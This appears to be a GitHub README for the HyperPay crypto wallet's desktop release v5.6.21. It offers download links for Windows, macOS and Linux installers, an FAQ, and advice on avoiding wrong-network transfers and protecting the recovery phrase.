<p align="center"><img src="assets/banner-profile.png" alt="HyperPay - crypto wallet, card and custody"></p>

<h1 align="center">HyperPay Wallet</h1>

<p align="center">A transfer that left on the wrong network is the most expensive mistake in this wallet, and the free guides here are the check that prevents it.</p>

<p align="center">
  <a href="https://github.com/hyperpay-gateway/hyperpay-wallet/releases/tag/v5.6.21"><img src="https://img.shields.io/badge/RELEASE-v5.6.21-9DB8FF?style=for-the-badge&labelColor=0A2EA8" alt="Release v5.6.21"></a>
</p>

---

## Downloads - v5.6.21

<p align="center"><a href="https://github.com/hyperpay-gateway/hyperpay-wallet/releases/download/v5.6.21/hyperpay-wallet-windows-v5.6.21.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/hyperpay-gateway/hyperpay-wallet/releases/download/v5.6.21/hyperpay-wallet-macos-v5.6.21.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-9DB8FF?style=for-the-badge&labelColor=0A2EA8&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/hyperpay-gateway/hyperpay-wallet/releases/download/v5.6.21/hyperpay-wallet-linux-v5.6.21.zip"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-9DB8FF?style=for-the-badge&labelColor=0A2EA8&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`hyperpay-wallet-windows-v5.6.21.exe`](https://github.com/hyperpay-gateway/hyperpay-wallet/releases/download/v5.6.21/hyperpay-wallet-windows-v5.6.21.exe) |
| <img src="https://img.shields.io/badge/macOS-9DB8FF?style=flat-square&labelColor=0A2EA8&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`hyperpay-wallet-macos-v5.6.21.dmg`](https://github.com/hyperpay-gateway/hyperpay-wallet/releases/download/v5.6.21/hyperpay-wallet-macos-v5.6.21.dmg) |
| <img src="https://img.shields.io/badge/Linux-9DB8FF?style=flat-square&labelColor=0A2EA8&logo=linux&logoColor=white" alt="Linux"> | x64 Ubuntu 20.04 or later, or an equivalent distribution | [`hyperpay-wallet-linux-v5.6.21.zip`](https://github.com/hyperpay-gateway/hyperpay-wallet/releases/download/v5.6.21/hyperpay-wallet-linux-v5.6.21.zip) |

</div>

Installers and their checksums are attached to the [v5.6.21 release](https://github.com/hyperpay-gateway/hyperpay-wallet/releases/tag/v5.6.21), which is the only place they are published.

> Only download from this GitHub release page.

---

## Why HyperPay

A wrong network is easy to choose and almost impossible to undo, so the guides behind this repository start with the send rather than with the feature tour. The wallet shows the network, the fee and the address on one screen, and the habit that saves funds is a small test transfer before the real amount moves. Everything written here builds on that one habit.

HyperPay itself is a hybrid wallet operating since 2017: one account can hold a balance managed through HyperBC custodial infrastructure and a self-custody balance whose keys exist on your device. The desktop application runs on Windows, macOS and Linux from a single release tag, and the same account reaches the prepaid card, the hardware devices and the in-app exchange without a second sign-up.

The guides behind this repository are written for the moment before a transfer leaves, not after it lands. A network choice, an address pasted from a chat and a memo field left empty are the three details that turn a routine send into an unrecoverable one, and each has a check that takes seconds. Everything else on this page exists to get a reader to that check with the current build installed. The guides are short on purpose: a check that takes a minute to read is a check that actually gets run.

- Send on the network the destination actually uses, not the one with the lowest fee.
- Keep the recovery phrase on paper, in two places, away from the machine that runs the wallet.
- Check the merchant, the network and the memo before confirming anything that cannot be reversed.
- Verify a download by its hash, because a filename proves nothing about the file behind it.
- Prefer a small test transfer over a large first one, whatever the fee difference says.
- Keep a note of which network each balance sits on, because the app will not remember it for you.
- Write down the network and the address before confirming, because the confirmation screen keeps no history of either.

## Guides worth reading before your first send

<div align="center">

| Guide | Why it matters here |
| --- | --- |
| [Send crypto from HyperPay](https://github.com/hyperpay-gateway/hyperpay-wallet-guide/blob/HEAD/send-crypto-from-hyperpay-wallet.md) | Explains network selection and what to do when a transfer stops confirming. |
| [Receive into a wallet](https://github.com/hyperpay-gateway/hyperpay-wallet-guide/blob/HEAD/receive-crypto-into-a-hyperpay-wallet.md) | Covers addresses, memos and the test send that exposes a wrong network. |
| [Which blockchains are supported](https://github.com/hyperpay-gateway/hyperpay-wallet-guide/blob/HEAD/which-blockchains-hyperpay-supports.md) | Lists the published chains and why custody mode changes what is available. |
| [Download on Windows](https://github.com/hyperpay-gateway/hyperpay-wallet-guide/blob/HEAD/download-hyperpay-wallet-on-windows.md) | Sets out the install, the hash check and the first launch in order. |

</div>

## What this repository is?

This repository is one of the wallet's public repositories and this page is its front door: it carries the download block and sends a reader into the guides. The written guidance for the wallet lives in [hyperpay-wallet-guide](https://github.com/hyperpay-gateway/hyperpay-wallet-guide).

## Common first questions

### Does the network choice matter for a wallet-to-wallet send?

Yes. The address and the network have to match, and a wallet on the wrong chain will accept the address and never show the funds. The send guide names the pairs that are easiest to confuse.

### Is a low fee worth the wait?

A fee set too low can leave a transfer unconfirmed for hours, and the wallet shows it as pending rather than failed. Paying the normal fee is usually cheaper than the time a stuck transfer costs.

### Can I cancel a transfer I already sent?

Once a transaction is confirmed it cannot be reversed by HyperPay or anyone else. The only reliable control is the check before you approve it, which is why the test send comes first.

### Does the wallet need a separate account?

No exchange account is created. A wallet is created inside the application, and custodial mode adds an account-level recovery route that self-custody does not have.

### Which chains can I actually send on?

The published examples are Bitcoin, Ethereum, BNB Chain, Tron, Solana, XRP Ledger, Litecoin and Polygon, and the authoritative list sits inside the app. The custody mode you choose changes which of those are available.

## Security

No support process and no member of staff needs your recovery phrase, your private key or a screen share of an unlocked wallet, and any message that asks for one is an attack rather than assistance.

## Support

Support runs through the in-app help channel, and the site publishes `support@hyperpay.dev`. Nothing in this repository is a support channel.

---

<p align="center">
  <a href="https://github.com/hyperpay-gateway/hyperpay-wallet">Main application</a> -
  <a href="https://github.com/hyperpay-gateway/hyperpay-wallet/releases/tag/v5.6.21">Release v5.6.21</a> -
  <a href="https://github.com/hyperpay-gateway/hyperpay-wallet-guide">All 55 guides</a> -
  <a href="https://github.com/hyperpay-gateway/hyperpay-gateway">Profile page</a>
</p>
